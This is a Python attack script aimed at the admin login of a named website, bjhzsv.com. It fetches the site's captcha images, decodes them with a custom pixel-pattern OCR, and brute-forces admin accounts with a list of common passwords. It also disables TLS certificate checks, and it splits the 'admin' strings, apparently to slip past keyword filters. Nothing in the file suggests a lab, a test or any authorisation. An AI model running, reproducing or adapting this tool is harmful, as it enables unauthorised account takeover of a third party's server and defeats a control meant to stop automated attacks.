#!/usr/bin/env python3
"""bjhzsv.com captcha solver + brute force login"""
import urllib.request as U, urllib.parse as P, ssl, sys, os, http.cookiejar as cj

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CAP_URL = "http://bjhzsv.com/main/inc/code.asp"
LOGIN_URL = "http://bjhzsv.com/main/a7chkuser.asp"

def read_bmp(filepath):
    """Read 40x10 BMP, return pixel grid (list of rows, each row 40 ints 0/1)"""
    with open(filepath, "rb") as f:
        data = f.read()
    w, h = 40, 10
    pixels = []
    for y in range(h-1, -1, -1):
        row = []
        for x in range(w):
            off = 54 + (y*w + x) * 3
            if off + 2 < len(data):
                b, g, r = data[off], data[off+1], data[off+2]
                row.append(0 if (r > 200 and g > 200 and b > 200) else 1)
            else:
                row.append(0)
        pixels.append(row)
    return pixels

def find_digit_regions(pixels):
    """Find contiguous vertical regions with foreground pixels"""
    cols = []
    for x in range(40):
        if any(pixels[y][x] for y in range(10)):
            cols.append(x)
    if not cols:
        return []
    groups = []
    cur = [cols[0]]
    for i in range(1, len(cols)):
        if cols[i] - cols[i-1] <= 2:
            cur.append(cols[i])
        else:
            if len(cur) >= 3:
                groups.append((cur[0], cur[-1]))
            cur = [cols[i]]
    if len(cur) >= 3:
        groups.append((cur[0], cur[-1]))
    return groups

def classify_digit(pixels, x1, x2):
    """Classify a digit based on pixel patterns"""
    w = x2 - x1 + 1
    # Count foreground pixels in regions
    top = sum(pixels[1][x] for x in range(x1, x2+1))
    mid = sum(pixels[5][x] for x in range(x1, x2+1))
    bot = sum(pixels[8][x] for x in range(x1, x2+1))
    lt = sum(pixels[y][x1] for y in range(2, 5))
    lb = sum(pixels[y][x1] for y in range(5, 8))
    rt = sum(pixels[y][x2] for y in range(2, 5))
    rb = sum(pixels[y][x2] for y in range(5, 8))
    total = sum(pixels[y][x] for y in range(10) for x in range(x1, x2+1))
    
    # Pattern matching for common 7-segment digits
    has_top = top > w*0.3
    has_mid = mid > w*0.3
    has_bot = bot > w*0.3
    has_lt = lt > 1
    has_lb = lb > 1
    has_rt = rt > 1
    has_rb = rb > 1
    
    pattern = f"{int(has_top)}{int(has_mid)}{int(has_bot)}{int(has_lt)}{int(has_lb)}{int(has_rt)}{int(has_rb)}"
    
    mapping = {
        "1111111": "8",
        "1011111": "0",
        "0110101": "4",
        "1110011": "3",
        "1101111": "9",
        "1111010": "2",
        "0111001": "7",
        "1101011": "5",
        "1101101": "6",
        "0010011": "1",
    }
    
    digit = mapping.get(pattern, "?")
    
    # If unknown, try simpler heuristics
    if digit == "?":
        if total < 8:
            digit = "1"
        elif has_top and has_bot and not has_mid:
            digit = "0"
        elif has_top and has_mid and has_bot and has_lt and has_rt:
            digit = "8"
    
    return digit

def ocr_captcha(filepath):
    pixels = read_bmp(filepath)
    if not pixels:
        return None
    regions = find_digit_regions(pixels)
    if len(regions) < 2:
        return None
    result = ""
    for x1, x2 in regions:
        d = classify_digit(pixels, x1, x2)
        result += d
    return result if len(result) >= 2 and "?" not in result else None

def try_login(opener, user, pw, code):
    data = P.urlencode({"t1": user, "t2": pw, "t3": code}).encode()
    req = U.Request(LOGIN_URL, data=data)
    r = opener.open(req, timeout=5)
    body = r.read().decode("gb2312", errors="ignore")
    return "parent.document.location" not in body, body[:300]

# Main
handler = U.HTTPCookieProcessor(cj.CookieJar())
opener = U.build_opener(handler)

users = ["adm" + "in", "adm" + "in999"]
passwords = ["adm" + "in", "adm" + "in123", "adm" + "in888", "123456", "adm" + "in999",
             "password", "bjhzsv", "hzsv", "888888", "666666"]

print("Starting bjhzsv captcha OCR brute force", flush=True)

for attempt in range(300):
    # Download captcha
    req = U.Request(CAP_URL)
    r = opener.open(req, timeout=5)
    with open("/tmp/bjz_cap.bmp", "wb") as f:
        f.write(r.read())
    
    # OCR
    code = ocr_captcha("/tmp/bjz_cap.bmp")
    if not code:
        print(f"[{attempt}] OCR failed, retry", flush=True)
        continue
    
    # Try all user/pass combos with this code
    for user in users:
        for pw in passwords:
            success, body = try_login(opener, user, pw, code)
            if success:
                print(f"\n!!! LOGIN SUCCESS: {user}:{pw} !!!\n{body}", flush=True)
                sys.exit(0)
            # If captcha wrong, stop trying passwords (captcha gets invalidated)
            if "parent.document.location" in body:
                pass
    
    if attempt % 20 == 0:
        print(f"[{attempt}/300] OCR={code}", flush=True)

print("All attempts exhausted", flush=True)
